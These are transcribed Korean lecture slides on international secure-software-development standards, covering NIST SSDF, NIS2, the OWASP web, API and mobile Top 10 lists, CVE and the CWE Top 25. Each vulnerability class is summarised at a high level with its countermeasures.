## [2-SLIDES] 1주차 3차시 p.6 · 국외 개발보안 현황
국외 개발보안 현황

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[타임라인: 국외 SW 개발보안 표준·지침의 흐름 (왼쪽 끝 'Penetrate & Patch' 시대에서 오른쪽으로 진행)]

| 연도 | 표준·지침 |
| --- | --- |
| 1983 | TCSEC |
| 1989 | Military Standard 1785 on System Security Engineering |
| 1994 | CMVP |
| 1996 | Common Criteria |
| 1997 | DoD DITSCAP |
| 1999 | DCID 6/3 |
| 2000 | **Ross Anderson's Security Engineering** (빨간 강조) |
| 2002 | **FISMA** (빨간 강조), MS-SDL (2002, but actually 2004) |
| 2003 | NIST SSDLC SP800-64 |
| 2004 | NIST C&A SP800-37, McGraw Touchpoints |
| 2006 | OWASP CLASP, **CNSS: Bringing the Three C&A Approaches Together** (빨간 강조) |
| 2007 | DoD DIACAP |
| 2008 | ICD 503, SAFECode |
| 2009 | OWASP SAMM, BSIMM |
| 2010 | NIST RMF SP800-37 Rev.1 |
| 2011 | DoD Revitalization of System Security |
| 2013 | DIARMF A&A |
| 2015 | **DoD Cyber Strategy** (빨간 강조) |
| 2016 | NIST System Security Engineering SP800-160, SAE J3061 |
| 2017 | CSA SDF |
| 2019 | DoD RMF |
| 2020 | **UNECE** (빨간 강조) |

---

## [2-SLIDES] 1주차 3차시 p.7 · 국외 개발보안 현황
국외 개발보안 현황
국외에서는 소프트웨어 개발보안을 강화하기 위해 다양한 표준과 지침이 마련되어 있음.
NIST의 안전한 소프트웨어 개발 프레임워크(SSDF) - 미국
소프트웨어 개발 생명주기 전반에 걸쳐 보안 관행을 통합하기 위한 지침을 제공하며, 주요내용은 다음과 같음.
- 정의: 소프트웨어 개발 초기 단계에서 보안 요구사항을 명확히 정의하여 보안을 설계에 반영
- 위험 식별 및 관리: 빌드 시스템을 포함한 개발 환경의 보안 위험을 식별하고 적절한 보안 통제를 구현
- 자동화 도구 활용: 코드의 무결성을 확보하기 위해 자동화된 도구를 도입하여 정적 및 동적 분석을 수행
- 소프트웨어 구성요소 검토: 사용되는 라이브러리나 패키지 등의 구성요소에 알려진 취약점이 없는지 검사

---

## [2-SLIDES] 1주차 3차시 p.8 · 국외 개발보안 현황
국외 개발보안 현황
NIS2 지침 – 유렵연합(EU)
NIS2(Network and Information Security Directive 2)는 디지털 인프라를 보호하고 사이버 공격에
대한 대응력을 높이기 위한 공통의 사이버 보안 수준을 구축하는 것을 목표로 함. SW개발보안과 관련하여
조직이 다음과 같은 조치를 취하도록 요구함.
- 위험 분석 및 정보 시스템 보안 정책 수립: 조직은 정기적인 위험 분석을 수행하고, 이를 기반으로 정보 시스템 보안 정책을 수립
- 사고 대응 및 위기 관리: 사이버 사고 발생 시 신속하게 대응하고, 비즈니스 연속성을 유지하기 위한 위기 관리 계획 마련
- 공급망 보안 강화: 공급업체 및 서비스 제공자와의 관계에서 보안 요구 사항을 명확히 하고 관리
- 네트워크 및 정보 시스템의 보안 유지: 시스템의 개발 및 유지보수 과정에서 보안을 고려하고, 취약점 관리 절차 도입

---

## [2-SLIDES] 1주차 3차시 p.9 · SW개발보안 국외기준
SW개발보안 국외기준
01 국외 개발보안 현황
02 OWASP TOP 10
03 CVE
04 CWE Top 25

---

## [2-SLIDES] 1주차 3차시 p.10 · OWASP TOP 10
OWASP TOP 10
(https://owasp.org/www-project-top-ten/)
OWASP(Open Web Application Security Project)는 웹 애플리케이션의 보안 강화를 위해
가장 치명적인 보안 취약점 10가지를 정리한 OWASP Top 10을 주기적으로 발표.
웹 개발자, 보안 전문가 및 조직이 보안 위협을 예방하는데 중요한 지침으로 활용

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[OWASP 웹사이트 'OWASP Top Ten' 페이지 캡처]
- 탭: Main / Translation_Efforts / Sponsors / Data_2020
- "The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications."
- 인용: "Globally recognized by developers as the first step towards more secure coding."
- "Companies should adopt this document and start the process of ensuring that their web applications minimize these risks. Using the OWASP Top 10 is perhaps the most effective first step towards changing the software development culture within your organization into one that produces more secure code."
- 오른쪽: The OWASP Foundation 소개, Project Information(Flagship Project, Documentation, Builder, Defender)

---

## [2-SLIDES] 1주차 3차시 p.11 · OWASP TOP 10
OWASP TOP 10
(https://owasp.org/www-project-top-ten/)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식: OWASP Top 10 버전별 변화 (2013 → 2017 → 2021), 화살표로 순위 이동 표시]

| 순위 | 2013 | 2017 | 2021 |
| --- | --- | --- | --- |
| A1 | Injection | Injection | Broken Access Control |
| A2 | Broken Authentication and Session Management | Broken Authentication | Cryptographic Failures |
| A3 | Cross-Site Scripting (XSS) | Sensitive Data Exposure | Injection |
| A4 | Insecure Direct Object References | 🆕 XML External Entities (XXE) | 🆕 Insecure Design |
| A5 | Security Misconfiguration | Broken Access Control | Security Misconfiguration |
| A6 | Sensitive Data Exposure | Security Misconfiguration | Vulnerable and Outdated Components |
| A7 | Missing Function Level Access Control | Cross-Site Scripting (XSS) | Identification and Authentication Failures |
| A8 | Cross-Site Request Forgery | 🆕 Insecure Deserialization | 🆕 Software and Data Integrity Failures |
| A9 | Using Components with Known Vulnerabilities | Using Components with Known Vulnerabilities | Security Logging and Monitoring Failures |
| A10 | Unvalidated Redirects and Forwards | 🆕 Insufficient Logging & Monitoring | 🆕 Server-Side Request Forgery (SSRF) |

주요 이동: 2017 A5 Broken Access Control → 2021 **A1**로 상승 / 2017 A1 Injection → 2021 A3 (XSS는 Injection에 통합) / 2017 A3 Sensitive Data Exposure → 2021 A2 Cryptographic Failures / 2017 A8 Insecure Deserialization → 2021 A8 Software and Data Integrity Failures에 통합 (🆕 = NEW 표시)

---

## [2-SLIDES] 1주차 3차시 p.12 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
1. Broken Access Control(취약한 접근 통제)
개요
- 인증된 사용자라도 접근이 제한된 데이터나 기능에 접근할 수 있는 취약점
- 예: 사용자가 다른 계정의 데이터를 조회하거나, 관리자 기능을 수행할 수 있음
대응 방안
- 모든 요청에 대해 접근 권한 확인
- 최소 권한 원칙(Least Privilege) 적용
- 역할 기반 접근 제어(Role-Based Access Control, RBAC) 구현

---

## [2-SLIDES] 1주차 3차시 p.13 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
2. Cryptographic Failures(암호화 실패)
개요
- 데이터 보호가 제대로 되지 않아 기밀 정보가 노출되는 취약점
- 예: 민감한 데이터를 평문(Plaintext)으로 저장하거나 전송
대응 방안
- HTTPS/TLS 사용하여 데이터 암호화
- 안전한 암호화 알고리즘(AES, RSA) 사용
- 비밀번호는 해시 및 솔트(Hashing & Salting) 적용

---

## [2-SLIDES] 1주차 3차시 p.14 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
3. Injection(인젝션 공격)
개요
- 공격자가 악성 코드를 삽입하여 데이터베이스 조작 및 시스템 장악 가능
- 예: SQL Injection, XSS(Cross-Site Scripting), Command Injection
대응 방안
- 사용자 입력값을 검증하고 필터링
- SQL 쿼리에서는 Prepared Statement 및 ORM(Object-Relational Mapping) 사용
- 입력값을 실행하지 않고 안전하게 처리

---

## [2-SLIDES] 1주차 3차시 p.15 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
4. Insecure Design(보안 설계 미흡)
개요
- 보안 요소를 고려하지 않은 시스템 설계로 인해 취약점이 발생
- 예: 비밀번호 없이 관리자 패널 접근 가능
대응 방안
- 보안 설계 원칙(Security by Design) 적용
- 위협 모델링(Threat Modeling) 수행
- 보안 설계를 코드에 반영하고 주기적으로 검토

---

## [2-SLIDES] 1주차 3차시 p.16 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
5. Misconfiguration(보안 설정 오류)
개요
- 기본 설정값 유지, 디버그 모드 활성화 등으로 인해 발생하는 취약점
- 예: 관리자 패널의 기본 아이디/비밀번호 미변경
대응 방안
- 불필요한 기능 및 서비스 비활성화
- 보안 패치 및 업데이트 주기적 적용
- 환경 설정 파일의 접근 제한

---

## [2-SLIDES] 1주차 3차시 p.17 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
6. Vulnerable and Outdated Components(취약하고 오래된 구성요소)
개요
- 오래된 라이브러리, 프레임워크, 플러그인을 사용하여 공격에 노출
- 예: 패치가 적용되지 않은 오픈소스 소프트웨어 사용
대응 방안
- 최신 버전의 라이브러리 및 프레임워크 유지
- 사용 중인 오픈소스 및 서드파티 모듈의 보안 이슈 확인
- 소프트웨어 구성 목록(SBOM, Software Bill of Materials) 관리

---

## [2-SLIDES] 1주차 3차시 p.18 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
7. Identification and Authentication Failures(인증 및 세션 관리 취약점)
개요
- 약한 비밀번호, 세션 하이재킹 등의 문제로 인증이 우회될 가능성이 있는 취약점
- 예: 브루트 포스 공격(무작위 비밀번호 대입), JWT 토큰 유출
대응 방안
- 다중 요소 인증(MFA) 적용
- 안전한 세션 관리(토큰 만료 및 회수)
- 강력한 비밀번호 정책 적용 및 보호

---

## [2-SLIDES] 1주차 3차시 p.19 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
8. Software and Data Integrity Failures(소프트웨어 및 데이터 무결성 실패)
개요
- 무결성을 검증하지 않은 코드 및 데이터로 인해 악성 코드가 실행될 가능성이 있는 취약점
- 예: 코드 서명 없는 업데이트 파일, 신뢰할 수 없는 CI/CD 파이프라인
대응 방안
- 코드 서명(Code Signing) 및 무결성 검증
- CI/CD 파이프라인 보안 강화
- 서드파티 구성 요소의 신뢰성 검토

---

## [2-SLIDES] 1주차 3차시 p.20 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
9. Security Logging and Monitoring Failures(보안 로깅 및 모니터링 실패)
개요
- 보안 이벤트를 로깅하지 않거나 적절한 모니터링이 없어 공격을 탐지하지 못하는 취약점
- 예: 로그인 실패 기록 미비, 이상 트래픽 감지 불가
대응 방안
- 보안 이벤트 로깅 및 중앙화된 로그 관리
- SIEM(Security Information and Event Management) 도입
- 보안 인시던트 대응 체계 구축

---

## [2-SLIDES] 1주차 3차시 p.21 · OWASP TOP 10 2021
OWASP TOP 10 2021
(https://owasp.org/www-project-top-ten/)
10. Server-Side Request Forgery(SSRF)
개요
- 공격자가 서버를 이용해 내부 네트워크를 스캔하거나 외부 사이트를 공격하는 취약점
- 예: 웹 애플리케이션에서 내부 시스템의 민감한 데이터 요청 가능
대응 방안
- 외부 요청을 제한하고 허용 목록(Allowlist) 적용
- 입력값 검증 및 보안 헤더(Content Security Policy) 설정
- 네트워크 레벨에서 API 호출 제한

---

## [2-SLIDES] 1주차 3차시 p.22 · OWASP API Security Risk TOP 10
OWASP API Security Risk TOP 10
OWASP(Open Web Application Security Project)의 API Security Top 10은
API(Application Programming Interface)의 보안 취약점과 이에 대한 대응 방안을 정리한 리스트.
API는 웹 애플리케이션과 서비스 간의 데이터 교환을 가능하게 하지만,보안이 취약할 경우 심각한 보안 사고를 초래할 수 있다.

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[표: OWASP API Security Top-10 2019 → 2023 비교]

| 순위 | 2019 | 2023 | 변화 |
| --- | --- | --- | --- |
| API1 | Broken Object Level Authorization | Broken Object Level Authorization | 유지 |
| API2 | Broken User Authentication | Broken Authentication | Updated |
| API3 | Excessive Data Exposure | Broken Object Property Level Authorization | Updated (2019 API3 + API6 통합) |
| API4 | Lack of Resources & Rate Limiting | Unrestricted Resource Consumption | Updated |
| API5 | Broken Function Level Authorization | Broken Function Level Authorization | 유지 |
| API6 | Mass Assignment | Unrestricted Access to Sensitive Business Flows | New |
| API7 | Security Misconfiguration | Server-Side Request Forgery (SSRF) | New |
| API8 | Injection | Security Misconfiguration | 유지(순위 이동) |
| API9 | Improper Assets Management | Improper Inventory Management | Updated |
| API10 | Insufficient Logging & Monitoring | Unsafe Consumption of APIs | New |

(2019의 API9·API10은 점선 상자 = Removed. 2019 API3 Excessive Data Exposure와 API6 Mass Assignment가 화살표로 2023 API3에 합쳐짐)

---

## [2-SLIDES] 1주차 3차시 p.23 · OWASP API Security Risk TOP 10 2023
OWASP API Security Risk TOP 10 2023
1. Broken Object Level Authorization(객체 수준 권한 관리 실패)
개요
API 요청에서 사용자 권한을 제대로 검증하지 않아, 공격자가 다른 사용자의 데이터를 조회, 수정, 삭제할 수 있는 취약점
대응 방안
- 요청마다 인증 및 권한 검사를 수행
- 최소 권한 원칙(Least Privilege) 적용
- 강력한 ID 기반 접근 제어(Access Control) 정책 구현

---

## [2-SLIDES] 1주차 3차시 p.24 · OWASP API Security Risk TOP 10 2023
OWASP API Security Risk TOP 10 2023
2. Broken Authentication(취약한 인증)
개요
API에서 인증 과정이 제대로 보호되지 않으면, 공격자가 불법적으로 인증을 우회하거나 계정을 탈취할 수 있다.
대응 방안
- 다중 요소 인증(MFA) 적용
- 보안이 강화된 인증 토큰 사용 (JWT, OAuth2)
- 인증 토큰의 만료 및 회수 정책 설정

---

## [2-SLIDES] 1주차 3차시 p.25 · OWASP API Security Risk TOP 10 2023
OWASP API Security Risk TOP 10 2023
3. Broken Object Property Level Authorization(객체 속성 수준의 권한 관리 실패)
개요
API 응답에서 민감한 데이터가 과도하게 노출되거나, 허가되지 않은 사용자가 특정 속성을 수정할 수 있는 취약점
대응 방안
- API 응답에서 노출되는 데이터 최소화
- 사용자 입력 값에 대한 권한 검증 수행
- 클라이언트 측 검증이 아닌 서버 측 검증 필수

---

## [2-SLIDES] 1주차 3차시 p.26 · OWASP API Security Risk TOP 10 2023
OWASP API Security Risk TOP 10 2023
4. Unrestricted Resource Consumption(제한 없는 리소스 소비)
개요
공격자가 API 요청을 과도하게 보내 서버의 CPU, 메모리, 네트워크를 소모시키는 취약점 (DDoS 공격 가능)
대응 방안:
- 요청 수 및 속도 제한(Rate Limiting) 적용
- API 호출에 대한 타임아웃 및 최대 크기 제한 설정
- 트래픽 이상 감지 및 자동 차단 설정

---

## [2-SLIDES] 1주차 3차시 p.27 · OWASP API Security Risk TOP 10 2023
OWASP API Security Risk TOP 10 2023
5. Broken Function Level Authorization(기능 수준의 권한 관리 실패)
개요
공격자가 관리자 기능을 일반 사용자 권한으로 실행하거나, 권한이 없는 API 엔드포인트를 호출하는 취약점.
대응 방안
- 사용자 역할(Role-Based Access Control, RBAC) 적용
- 모든 기능에 대한 인증 및 권한 검증 수행
- 권한이 없는 기능 요청을 즉시 차단

---

## [2-SLIDES] 1주차 3차시 p.28 · OWASP API Security Risk TOP 10 2023
OWASP API Security Risk TOP 10 2023
6. Unrestricted Access to Sensitive Business Flows(민감한 비즈니스 흐름에 대한 무제한 접근)
개요
API에서 인증 없이 중요한 프로세스를 실행할 수 있을 때 발생하는 취약점입니다.
예를 들어, OTP 인증 없이 비밀번호 재설정을 허용하는 경우
대응 방안
- 비즈니스 크리티컬 API에 강력한 인증 및 접근 제어 적용
- 사용자 입력 검증 및 워크플로우 기반 검증 강화
- 주요 프로세스에 대해 추가적인 보안 확인 적용

---

## [2-SLIDES] 1주차 3차시 p.29 · OWASP API Security Risk TOP 10
OWASP API Security Risk TOP 10
7. API7:2023 - Server Side Request Forgery (SSRF)
개요
공격자가 API를 통해 서버가 임의의 외부 URL을 요청하도록 조작할 수 있는 취약점입니다.
내부 네트워크 스캐닝 및 데이터 탈취에 악용될 수 있습니다.
대응 방안
- API에서 외부 요청을 차단하거나 허용 목록(Allowlist) 기반의 제한 적용
- URL 및 IP 주소 검증을 수행하여 내부 주소 접근 차단
- API에서 불필요한 외부 요청을 최소화

---

## [2-SLIDES] 1주차 3차시 p.30 · OWASP API Security Risk TOP 10 2023
OWASP API Security Risk TOP 10 2023
8. Security Misconfiguration(보안 설정 오류)
개요
기본 설정값을 사용하거나, 디버그 모드를 활성화하는 등 보안 설정이 제대로 구성되지 않은 경우 발생하는 취약점
대응 방안
- 보안 정책을 수립하고 정기적인 보안 점검 수행
- API 서버 및 클라우드 환경에서 최소 권한 설정 적용
- 최신 보안 패치를 적용하고, 디버그 및 로그 설정을 보호

---

## [2-SLIDES] 1주차 3차시 p.31 · OWASP API Security Risk TOP 10 2023
OWASP API Security Risk TOP 10 2023
9. Improper Inventory Management(잘못된 API 관리)
개요
API가 버전 관리되지 않거나, 오래된 API 엔드포인트가 유지되어 공격자가 악용할 수 있는 취약점.
대응 방안
- API 버전 관리(V1, V2 등) 및 폐기 정책 정의
- 오래된 API를 비활성화하고 최신 버전으로 업그레이드 유도
- API 문서화를 철저히 하여 불필요한 노출 방지

---

## [2-SLIDES] 1주차 3차시 p.32 · OWASP API Security Risk TOP 10 2023
OWASP API Security Risk TOP 10 2023
10. Unsafe Consumption of APIs(안전하지 않은 API 소비)
개요
외부 API를 사용할 때 보안 검증 없이 데이터를 신뢰하면 발생하는 취약점.
예를 들어, API 응답을 검증하지 않아 악성 데이터를 받아들이는 경우.
대응 방안
- 외부 API 응답을 검증하고 신뢰할 수 있는 데이터만 처리
- API 호출 시 입력값 검증 적용 (JSON Schema, XML Validation 등)
- API 키 및 인증 토큰을 안전하게 관리

---

## [2-SLIDES] 1주차 3차시 p.33 · OWASP Mobile Risk TOP 10
OWASP Mobile Risk TOP 10
OWASP(Open Worldwide Application Security Project)는 모바일 애플리케이션의 보안 취약점을 식별하고
대응하기 위해 OWASP Mobile Top 10 목록을 주기적으로 발표. 가장 최근의 2024년 버전에서는
모바일 애플리케이션에서 가장 중요한 보안 위험 10가지를 다음과 같이 정의하고 있다

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[표: OWASP Mobile Top 10 — Comparison Between 2016-2024]

| 순위 | OWASP-2016 | OWASP-2024-Release | 변화 |
| --- | --- | --- | --- |
| M1 | Improper Platform Usage | Improper Credential Usage | New |
| M2 | Insecure Data Storage | Inadequate Supply Chain Security | New |
| M3 | Insecure Communication | Insecure Authentication / Authorization | Merged M4&M6 to M3 |
| M4 | Insecure Authentication | Insufficient Input/Output Validation | New |
| M5 | Insufficient Cryptography | Insecure Communication | Moved from M3 to M5 |
| M6 | Insecure Authorization | Inadequate Privacy Controls | New |
| M7 | Client Code Quality | Insufficient Binary Protections | Merged M8&M9 to M7 |
| M8 | Code Tampering | Security Misconfiguration | Rewording [M10] |
| M9 | Reverse Engineering | Insecure Data Storage | Moved from M2 to M9 |
| M10 | Extraneous Functionality | Insufficient Cryptography | Moved from M5 to M10 |

---

## [2-SLIDES] 1주차 3차시 p.34 · SW개발보안 국외기준
SW개발보안 국외기준
01 국외 개발보안 현황
02 OWASP TOP 10
03 CVE
04 CWE Top 25

---

## [2-SLIDES] 1주차 3차시 p.35 · CVE 취약점 DB활용(http://cve.mitre.org)
CVE 취약점 DB활용(http://cve.mitre.org)
CVE(공통 취약점 및 노출, Common Vulnerabilities and Exposures)는 소프트웨어 및 하드웨어의 보안 취약점을
표준화하여 공개하는 시스템.
CVE는 보안 취약점을 표준화하고 추적하는 중요한 시스템이며, 기업과 개발자는 이를 활용하여 보안성 강화
특히 소프트웨어 개발자는 CVE 데이터를 활용하여 보안 취약점을 사전에 예방하고 신속하게 패치 적용

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[CVE 웹사이트(cve.mitre.org) 캡처 — 메뉴: Search CVE List / Download CVE / Data Feeds / Request CVE IDs / Update a CVE Entry, 'TOTAL CVE Entries: 136476', NVD 링크. 하단에 Latest CVE News(Xiaomi·GitLab·OpenVPN이 CNA로 추가), Become a CNA(Total CNAs 128, Total Countries 21, 세계지도), Newest CVE Entries(트윗: CVE-2020-13758 Bitrix24 웹 방화벽의 XSS 우회)]

---

## [2-SLIDES] 1주차 3차시 p.36 · CVE 작동 방식
CVE 작동 방식
1. 취약점 발견
보안 연구원, 기업, 기관이 새로운 보안 취약점을 발견.
2. CVE 요청
CVE Numbering Authority(CNA)에 취약점 보고.
3. CVE ID 할당
MITRE가 검토 후 CVE ID 부여.
4. 공개 및 업데이트
취약점 세부 정보가 NVD 등에 등록되고, 보안 패치와 대응책 제공.

---

## [2-SLIDES] 1주차 3차시 p.37 · CVE 예제
CVE 예제
1. CVE ID: CVE-2022-24086
2. 발견 일자: 2022년 2월 13일
3. 영향을 받는 시스템: Adobe Commerce 및 Magento Open Source 2.3.3 ~ 2.4.3-p1 버전
4. 취약점 설명: 입력 데이터에 대한 적절한 검증이 이루어지지 않아, 공격자가 특수하게 조작된 입력을 통해 SQL 쿼
리를 조작하고, 이를 통해 데이터베이스에 임의의 코드를 실행하거나 민감한 정보를 탈취할 수 있는 취약점
5. 해결 방법: Adobe는 이 취약점을 해결하기 위해 보안 패치를 배포하였으며, 영향을 받는 사용자는 즉시 최신 버전
으로 업데이트할 것을 권장

---

## [2-SLIDES] 1주차 3차시 p.38 · CVE 와 소프트웨어 개발보안
CVE 와 소프트웨어 개발보안
1. 보안 패치 적용
CVE 목록을 모니터링하여 최신 보안 패치를 적용.
2. 취약점 관리 및 평가
조직은 CVE를 기반으로 보안 리스크를 분석하고 대응 계획을 수립.
3. 자동화된 보안 검사 활용
CVE 데이터베이스를 활용하여 취약점 스캐너 및 보안 도구(CVE Scanners) 운영.

---

## [2-SLIDES] 1주차 3차시 p.39 · SW개발보안 국외기준
SW개발보안 국외기준
01 국외 개발보안 현황
02 OWASP TOP 10
03 CVE
04 CWE Top 25

---

## [2-SLIDES] 1주차 3차시 p.40 · CWE 취약점 DB활용(http://cwe.mitre.org)
CWE 취약점 DB활용(http://cwe.mitre.org)
CWE(Common Weakness Enumeration)는 미 국토 안보부(The U.S. Department of Homeland Security)에
서 관리하고 있으며, 소프트웨어와 하드웨어의 보안약점을 체계적으로 정리한 공개 목록
CWE 주요 목적
1. 소프트웨어 및 하드웨어 취약점 분류 및 표준화
2. 보안 취약점의 예방 및 완화를 위한 지침 제공
3. 보안 평가 및 코드 분석 도구 연계
CWE의 활용
1. 개발자의 보안 코딩 가이드라인 제공
2. 보안점검도구(정적분석, 동적분석)에서 CWE 목록 기반 취약점 탐지
3. OWASP, NIST, CVE 등과 연계하여 보안 개선에 활용

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[CWE 웹사이트(cwe.mitre.org) 캡처 — 'Common Weakness Enumeration: A Community-Developed List of Software & Hardware Weakness Types', 메뉴 Home/About/CWE List/Scoring/Community/News/Search, 'View the List of Weaknesses'(by Software Development / by Hardware Design / by Research Concepts), Search CWE 검색창, 'Total Weaknesses: 839', 오른쪽 위 'CWE Top 25 Most Dangerous Software Errors' 배지]

---

## [2-SLIDES] 1주차 3차시 p.41 · CWE와 CVE의 차이점
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
CWE와 CVE의 차이점

| 구분 | CWE | CVE |
| --- | --- | --- |
| 역할 | 보안약점(Weakness Type) 정의 | 특정 제품의 보안취약점(Vulnerability) 개별 ID 부여 |
| 예시 | CWE-89 SQL Injection / CWE-79 XSS | CVE-2022-24086 특정제품의 SQL인젝션 취약점 |
| 적용범위 | 보안약점의 개념적 분류 | 실제 발생한 보안취약점(취약점 보고 및 패치 필요) |

---

## [2-SLIDES] 1주차 3차시 p.42 · CWE TOP 25
CWE TOP 25
(https://cwe.mitre.org/top25/archive/2022/2022_cwe_top25.html)
CWE Top 25는 소프트웨어에서 가장 위험한 보안 약점 25가지를 선정한 목록으로, 개발자와 보안 전문가들이
우선적으로 대응해야 할 취약점을 제시. 이 목록은 MITRE에서 관리하며, National Vulnerability Database (NVD)의
데이터를 기반으로 작성됩니다.
선정방법
소프트웨어 약점의 발생빈도와 심각도를 기반으로 선정.
최근 2년간의 CVE 데이터를 분석하여 각 약점의 점수 산정 한 뒤, 각 약점의 보급률과 심각도를 고려한 공식에 따라 계산
점수(CWE_X) = Fr(CWE_X) * Sv(CWE_X) * 100
Freq = {NVD의 각 CWE_X'에 대한 개수(CWE_X' ∈ NVD)}
Fr(CWE_X) = (카운트(CWE_X ∈ NVD) - 최소(Freq)) / (최대(Freq) - 최소(Freq))
Sv(CWE_X) = (average_CVSS_for_CWE_X - 최소(CVSS)) / (최대(CVSS) - 최소(CVSS))

---

## [2-SLIDES] 1주차 3차시 p.43 · CWE TOP 25 선정 목적 및 활용 방안
CWE TOP 25 선정 목적 및 활용 방안
주요목적
1. 취약점 인식: 가장 빈번하고 심각한 소프트웨어 약점을 강조하여 보안 사고 예방
2. 보안 강화: 개발 및 보안 팀이 우선적으로 해결해야 할 취약점을 파악하고 대응
3. 교육 자료: 보안 교육과 훈련에 활용되어 안전한 코딩과 설계 촉진
활용 방안
1. 보안 우선순위 설정: 개발 및 보안 팀은 CWE Top 25를 참고하여 취약점 대응의 우선순위를 정하고,
제한된 자원을 효과적으로 활용
2. 보안 교육 자료로 활용: CWE Top 25는 보안 교육의 핵심 자료로 사용되어, 개발자들이 흔히 발생하는 취약점을
이해하고 예방하는 데 도움을 줌
3. 보안 도구와의 연계: 정적 분석 도구나 취약점 스캐너는 CWE Top 25를 기반으로 코드를 검사하여, 잠재적인 보안 약점을
자동으로 탐지하고 보고

---

## [2-SLIDES] 1주차 3차시 p.44 · 2023 CWE TOP 25 (https://cwe.mitre.org/t
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
2023 CWE TOP 25 (https://cwe.mitre.org/top25/) — 1~12위

| 순위 | ID | Name | 점수 | 악용 빈도 | 순위 변화 |
| --- | --- | --- | --- | --- | --- |
| 1 | CWE-787 | Out-of-bounds Write | 63.72 | 70 | 0 |
| 2 | CWE-79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | 45.54 | 4 | 0 |
| 3 | CWE-89 | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') | 34.27 | 6 | 0 |
| 4 | CWE-416 | Use After Free | 16.71 | 44 | +3 |
| 5 | CWE-78 | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | 15.65 | 23 | +1 |
| 6 | CWE-20 | Improper Input Validation | 15.50 | 35 | -2 |
| 7 | CWE-125 | Out-of-bounds Read | 14.60 | 2 | -2 |
| 8 | CWE-22 | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | 14.11 | 16 | 0 |
| 9 | CWE-352 | Cross-Site Request Forgery (CSRF) | 11.73 | 0 | 0 |
| 10 | CWE-434 | Unrestricted Upload of File with Dangerous Type | 10.41 | 5 | 0 |
| 11 | CWE-862 | Missing Authorization | 6.90 | 0 | +5 |
| 12 | CWE-476 | NULL Pointer Dereference | 6.59 | 0 | -1 |

---

## [2-SLIDES] 1주차 3차시 p.45 · 2023 CWE TOP 25 (https://cwe.mitre.org/t
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
2023 CWE TOP 25 (https://cwe.mitre.org/top25/) — 13~25위

| 순위 | ID | Name | 점수 | 악용 빈도 | 순위 변화 |
| --- | --- | --- | --- | --- | --- |
| 13 | CWE-287 | Improper Authentication | 6.39 | 10 | +1 |
| 14 | CWE-190 | Integer Overflow or Wraparound | 5.89 | 4 | -1 |
| 15 | CWE-502 | Deserialization of Untrusted Data | 5.56 | 14 | -3 |
| 16 | CWE-77 | Improper Neutralization of Special Elements used in a Command ('Command Injection') | 4.95 | 4 | +1 |
| 17 | CWE-119 | Improper Restriction of Operations within the Bounds of a Memory Buffer | 4.75 | 7 | +2 |
| 18 | CWE-798 | Use of Hard-coded Credentials | 4.57 | 2 | -3 |
| 19 | CWE-918 | Server-Side Request Forgery (SSRF) | 4.56 | 16 | +2 |
| 20 | CWE-306 | Missing Authentication for Critical Function | 3.78 | 8 | -2 |
| 21 | CWE-362 | Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') | 3.53 | 8 | +1 |
| 22 | CWE-269 | Improper Privilege Management | 3.31 | 5 | +7 |
| 23 | CWE-94 | Improper Control of Generation of Code ('Code Injection') | 3.30 | 6 | +2 |
| 24 | CWE-863 | Incorrect Authorization | 3.16 | 0 | +4 |
| 25 | CWE-276 | Incorrect Default Permissions | 3.16 | 0 | -5 |

---

## [2-SLIDES] 1주차 3차시 p.46 · 요약 정리
요약 정리
국외 소프트웨어 개발보안을 위한 지속적인 활동을 학습함.
OWASP TOP 10 을 활용하여 웹 애플리케이션을 이용한 서비스 시
반드시 고려해야 하는 보안 이슈들을 학습함.
보안취약점 데이터베이스인 CVE 리스트의 용도를 이해하고 개발단계에
보안설계시 활용하는 방안을 학습함.
보안 약점 데이터베이스인 CWE 용도를 이해하고, CWE TOP 25 목록을
개발단계에 활용하여 소프트웨어 보안을 강화하는 체크리스트로 활용하는 것을
학습함.

---

## [2-SLIDES] 1주차 3차시 p.47 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [KISA] 클라우드서비스(SaaS)_보안인증기분_해설서(2023.3)
- [KISA] 주요정보통신기반시설 기술적 취약점 분석 평가 상세 가이드(2021.03)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
